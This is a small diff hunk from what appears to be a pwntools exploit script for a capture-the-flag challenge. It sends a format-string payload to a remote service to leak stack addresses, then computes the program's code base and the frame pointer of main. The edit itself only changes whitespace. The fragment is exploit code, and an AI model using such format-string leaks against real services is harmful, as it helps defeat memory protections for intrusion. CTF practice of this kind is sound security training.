@@ -20,7 +20,7 @@ else:
     server = remote('140.112.31.97',30104)
 
 server.sendlineafter('message : ', '%14$p%12$p%15$p')
-leaks = server.recvuntil('Your',drop=True).split(b'0x')[1:]
+leaks = server.recvuntil('Your', drop=True).split(b'0x')[1:]
 code_base = int(leaks[0],16) - csu_init
 rbp_offset = 224
 main_rbp = int(leaks[1],16) - rbp_offset
